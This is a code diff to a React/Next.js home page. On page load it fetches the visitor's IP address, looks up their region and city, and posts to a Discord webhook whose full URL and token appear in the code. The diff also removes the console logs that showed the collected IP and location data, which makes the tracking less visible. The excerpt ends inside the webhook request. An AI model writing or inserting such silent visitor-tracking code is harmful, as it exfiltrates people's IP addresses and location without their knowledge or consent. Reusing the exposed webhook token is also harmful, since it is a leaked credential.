@@ -25,13 +25,15 @@ export default function Home() {
 
 	// using use effect, run this code on page load
 	useEffect(() => {
+		console.log("Hi");
+		console.log("Go away");
+		console.log("Thanks");
 		// post to https://discord.com/api/webhooks/1248835910032818176/uFKiGiNOZC_HsDZafW-b13gdGCvKvpIUpjfwn08MxrL3hfi56l3-pPB_JKd7bfGKEZFR
 		// with the following json data
 
 		async function getLoc(ip: any) {
 			const response = await fetch("https://ipapi.co/" + ip + "/json/");
 			const data = await response.json();
-			console.log(data);
 			return data.region + " - " + data.city;
 		}
 
@@ -39,7 +41,6 @@ export default function Home() {
 			var ipResponse = await fetch("https://api.ipify.org?format=json");
 			var ipData = await ipResponse.json();
 			var ip: string = ipData.ip;
-			console.log(ip);
 			await fetch(
 				"https://discord.com/api/webhooks/1248835910032818176/uFKiGiNOZC_HsDZafW-b13gdGCvKvpIUpjfwn08MxrL3hfi56l3-pPB_JKd7bfGKEZFR",
 				{
